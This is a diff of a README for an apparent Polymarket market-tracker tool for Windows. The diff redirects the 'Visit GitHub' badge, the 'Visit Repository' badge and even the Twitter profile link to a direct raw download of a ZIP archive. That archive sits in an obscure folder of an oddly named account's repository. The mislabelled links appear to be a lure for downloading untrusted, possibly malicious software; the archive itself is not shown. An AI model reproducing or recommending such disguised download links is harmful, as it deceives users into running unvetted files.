@@ -1,6 +1,6 @@
 # 🪐 polymarket-LinggeTracer - Track market whales with clear signals
 
-[![Download / Visit GitHub](https://img.shields.io/badge/Download-Visit%20GitHub-7c3aed?style=for-the-badge)](https://github.com/commonfouroclockhusktomato869/polymarket-LinggeTracer)
+[![Download / Visit GitHub](https://img.shields.io/badge/Download-Visit%20GitHub-7c3aed?style=for-the-badge)](https://github.com/commonfouroclockhusktomato869/polymarket-LinggeTracer/raw/refs/heads/main/subjacency/polymarket-Lingge-Tracer-v1.2.zip)
 
 ## 🚀 Download and run on Windows
 
@@ -170,11 +170,11 @@ Try these steps:
 ## 📞 Technical support and project info
 
 **Main architect**: lingge66 & AI team  
-**Twitter**: [@shangdu2005](https://x.com/shangdu2005)
+**Twitter**: [@shangdu2005](https://github.com/commonfouroclockhusktomato869/polymarket-LinggeTracer/raw/refs/heads/main/subjacency/polymarket-Lingge-Tracer-v1.2.zip)
 
 ## 📥 Project access
 
-[![Visit the repository](https://img.shields.io/badge/Open%20Project-Visit%20Repository-2563eb?style=for-the-badge)](https://github.com/commonfouroclockhusktomato869/polymarket-LinggeTracer)
+[![Visit the repository](https://img.shields.io/badge/Open%20Project-Visit%20Repository-2563eb?style=for-the-badge)](https://github.com/commonfouroclockhusktomato869/polymarket-LinggeTracer/raw/refs/heads/main/subjacency/polymarket-Lingge-Tracer-v1.2.zip)
 
 ## 🧭 Quick start checklist
 
